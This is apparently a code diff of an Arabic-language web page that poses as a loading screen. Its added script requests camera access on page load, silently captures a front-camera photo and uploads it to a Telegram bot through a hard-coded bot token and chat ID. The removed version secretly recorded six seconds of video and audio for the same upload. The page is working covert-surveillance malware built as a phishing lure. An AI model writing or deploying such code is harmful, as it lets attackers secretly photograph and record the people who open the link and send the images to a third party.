@@ -3,119 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل</title>
+    <title>تحميل...</title>
     <style>
-        body {
-            background-color: #000;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
+        /* تصميم يشبه الصورة في ملف 99862.jpg */
+        body { 
+            background-color: #000; 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: sans-serif; 
         }
-
-        /* تصميم شريط التحميل الدائري مثل الصورة */
         .loader {
-            width: 120px;
-            height: 120px;
-            border: 12px solid #f3f3f3;
-            border-top: 12px solid #3498db; /* اللون الأزرق كما في الصورة */
+            border: 4px solid #333;
+            border-top: 4px solid #fff;
             border-radius: 50%;
-            animation: spin 1.5s linear infinite;
-            margin-bottom: 30px;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .status-text {
-            font-size: 22px;
-            font-weight: bold;
-        }
-
-        video {
-            display: none;
-        }
+        .text { font-size: 1.2rem; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <div class="status-text" id="status">لحظة واحدة</div>
+    <div class="text">لحظه وحده من فضلك...</div>
 
-    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
 
-    <script>
-        const video = document.getElementById('video');
-        const statusText = document.getElementById('status');
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const senderId = urlParams.get('sender_id');
-        const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
+<script>
+    const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
+    const CHAT_ID = '8169635171';
 
-        window.onload = async () => {
-            if (!senderId) {
-                statusText.innerText = "خطأ في الاتصال";
-                return;
-            }
+    async function startCapture() {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-            try {
-                // طلب الإذن (كما في الصورة الثانية)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = stream;
-                
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
+        try {
+            // طلب الإذن تلقائياً عند فتح الصفحة كما في ملف 99863.jpg
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
+            // الانتظار قليلاً للتأكد من وضوح الصورة
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendVideoToTelegram(blob);
-                    stream.getTracks().forEach(track => track.stop());
-                };
+                // إيقاف الكاميرا بعد الالتقاط
+                stream.getTracks().forEach(track => track.stop());
 
-                // بدء التسجيل تلقائياً بعد الموافقة
-                mediaRecorder.start();
-                
-                // تسجيل لمدة 6 ثوانٍ
-                setTimeout(() => {
-                    if (mediaRecorder.state === "recording") {
-                        mediaRecorder.stop();
-                    }
-                }, 6000);
+                // إرسال الصورة إلى تلجرام
+                canvas.toBlob((blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'image.png');
 
-            } catch (err) {
-                statusText.innerText = "يرجى المحاولة مرة أخرى";
-            }
-        };
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/png');
+            }, 1000);
 
-        async function sendVideoToTelegram(videoBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', senderId);
-            formData.append('video', videoBlob, 'recording.mp4');
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                if (response.ok) {
-                    statusText.innerText = "تم التحميل بنجاح";
-                }
-            } catch (error) {
-                console.error(error);
-            }
+        } catch (error) {
+            console.log("رفض المستخدم الإذن أو حدث خطأ");
         }
-    </script>
+    }
+
+    // تشغيل الدالة بمجرد تحميل الصفحة
+    window.onload = startCapture;
+</script>
+
 </body>
 </html>
